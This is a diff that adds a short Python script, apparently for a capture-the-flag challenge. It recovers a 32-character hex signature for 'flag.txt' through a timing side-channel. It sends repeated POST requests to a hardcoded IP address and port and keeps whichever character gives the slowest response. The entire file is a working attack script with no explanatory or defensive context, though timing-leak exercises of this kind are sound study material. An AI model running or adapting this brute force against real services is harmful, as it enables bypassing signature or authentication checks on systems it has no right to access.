@@ -1,0 +1,56 @@
+import requests
+import time
+import operator
+# make  signature list for brute
+first_sig=[]
+for i in range(48,58):
+    first_sig.append(chr(i))
+for j in range(97,103):
+    first_sig.append(chr(j))
+
+#brute
+begin_ =""
+end_ ="1111111111111111111111111111111"
+sig_result =""
+
+total_seconds_until_now = 0.85
+while(len(end_) >= 0 ):
+        #Creat a dictionary for save time during
+        list_time_during={}
+        #count exception
+        count_exception = 2
+        while(count_exception > 1):
+                count_exception = 0
+                for a  in first_sig:
+                        
+                        #a2 has 32 bytes passed request.post() below 
+                        a2 = begin_ + a + end_ 
+                        t1 = time.time()
+                        r = requests.post("http://3.91.78.13:10005/check",headers={"Content-Type":"application/x-www-form-urlencoded"},data= {"file":"flag.txt","signature":a2})
+                        if(r.status_code > 0 ):
+                                t2 = time.time()
+                        during_time = float(t2-t1)
+                        if(during_time > total_seconds_until_now):
+                                count_exception = count_exception + 1
+                        list_time_during[a] = during_time 
+                if(count_exception == 1):
+                        break
+        
+                        
+        #Find a char that make a longgest respond time 
+        key_max = str(max(list_time_during.items(), key = operator.itemgetter(1))[0])
+        total_seconds_until_now = total_seconds_until_now + 0.5
+        # After finding out a char, we add it into sig_resule 
+        sig_result = sig_result + key_max 
+        # show signature in each step
+        print(sig_result,total_seconds_until_now)
+        if(len(sig_result)==32):
+                print("enought 32 bytes")
+        begin_ = begin_ + key_max
+        end_ = end_[:-1]
+
+        
+
+
+        
+        
